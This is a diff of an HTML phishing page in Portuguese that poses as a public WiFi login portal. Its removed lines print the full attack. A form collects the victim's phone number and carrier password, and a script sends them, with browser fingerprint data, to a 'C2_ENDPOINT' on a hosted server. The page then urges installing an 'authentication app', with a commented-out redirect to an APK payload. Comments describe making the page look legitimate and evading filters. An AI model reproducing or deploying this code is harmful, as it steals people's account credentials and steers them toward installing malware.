@@ -5,12 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal de Conexão - WiFi Público</title>
     
-    <!-- Meta tags para SEO e enganação de filtros -->
+    <!-- Meta tags para parecer mais legítimo -->
     <meta name="description" content="Conecte-se à rede WiFi pública de forma rápida e segura.">
-    <meta name="keywords" content="wifi, publico, gratuito, internet, conexao">
     <meta name="author" content="Serviço de Conectividade Pública">
     
-    <!-- Favicon para parecer mais legítimo -->
+    <!-- Favicon -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📡</text></svg>">
 
     <style>
@@ -75,85 +74,3 @@
         .feedback.error { color: var(--danger-color); }
     </style>
 </head>
-<body>
-    <main class="auth-container">
-        <div class="logo">📡</div>
-        <h1>Portal de Conexão</h1>
-        <p class="subtitle">Para garantir uma conexão segura, por favor, autentique-se com os dados da sua operadora.</p>
-        
-        <form id="authForm" novalidate>
-            <div class="form-group">
-                <label for="phone">Número de Celular</label>
-                <input type="tel" id="phone" class="form-control" placeholder="(XX) XXXXX-XXXX" required>
-            </div>
-            <div class="form-group">
-                <label for="password">Senha da Operadora</label>
-                <input type="password" id="password" class="form-control" placeholder="Sua senha" required>
-            </div>
-            <button type="submit" class="btn btn-primary" id="submitBtn">Gerar Código de Acesso</button>
-            <p id="feedback" class="feedback"></p>
-        </form>
-    </main>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const form = document.getElementById('authForm');
-            const submitBtn = document.getElementById('submitBtn');
-            const feedbackEl = document.getElementById('feedback');
-            
-            // URL do seu servidor no Replit (ou outro serviço)
-            const C2_ENDPOINT = 'https://SEU-PROJETO.replit.app/log';
-
-            form.addEventListener('submit', async (e) => {
-                e.preventDefault();
-
-                const phone = document.getElementById('phone').value;
-                const password = document.getElementById('password').value;
-
-                // Estado de carregamento
-                submitBtn.disabled = true;
-                submitBtn.textContent = 'Processando...';
-                feedbackEl.textContent = '';
-                feedbackEl.className = 'feedback';
-
-                try {
-                    const response = await fetch(C2_ENDPOINT, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            phone,
-                            password,
-                            // Coleta de fingerprinting avançado
-                            userAgent: navigator.userAgent,
-                            language: navigator.language,
-                            platform: navigator.platform,
-                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                            timestamp: new Date().toISOString()
-                        })
-                    });
-
-                    if (response.ok) {
-                        feedbackEl.textContent = 'Código enviado! Para ativar, instale nosso aplicativo de autenticação.';
-                        feedbackEl.classList.add('success');
-                        // Lógica para redirecionar para o payload (APK) em 3 segundos
-                        setTimeout(() => {
-                            // window.location.href = 'https://URL-DO-SEU-APK/app.apk';
-                            feedbackEl.textContent += ' Redirecionando...';
-                        }, 3000);
-                    } else {
-                        throw new Error('Falha na autenticação com o servidor.');
-                    }
-                } catch (error) {
-                    feedbackEl.textContent = 'Não foi possível conectar. Tente novamente mais tarde.';
-                    feedbackEl.classList.add('error');
-                    console.error('Erro no envio:', error);
-                } finally {
-                    // Restaura o estado do botão
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = 'Gerar Código de Acesso';
-                }
-            });
-        });
-    </script>
-</body>
-</html>
